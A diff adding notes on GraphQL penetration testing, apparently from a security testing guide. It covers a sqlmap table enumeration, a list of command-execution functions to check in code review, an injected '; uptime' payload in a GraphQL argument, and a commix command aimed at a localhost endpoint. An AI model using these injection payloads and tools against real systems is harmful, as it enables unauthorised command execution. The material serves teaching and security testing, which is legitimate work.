@@ -152,3 +152,22 @@ query {
     }
 }
 sqlmap -r request.txt —dbms=sqlite —tables
+
+OS Command injection Automated Testing with Commix
+OS command injection can happen if a resolver function
+accepts arguments from a GraphQL field without implementing the necessary verifications on the input
+
+When performing source code review, look for
+the following imported libraries and functions, and see if their commands
+are constructed using custom user input:
+•  Python libraries such as subprocess and os and functions like exec and eval
+•  PHP functions such as system, shell_exec, eval, and exec
+•  Java functions such as Runtime.exec()
+•  Node.js modules such as child_process and functions like exec and spawn
+query {
+systemDebug(arg:"; uptime")
+}
+
+Automated Testing with Commix
+commix --url="http://127.0.0.1:5013/graphql"
+--data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
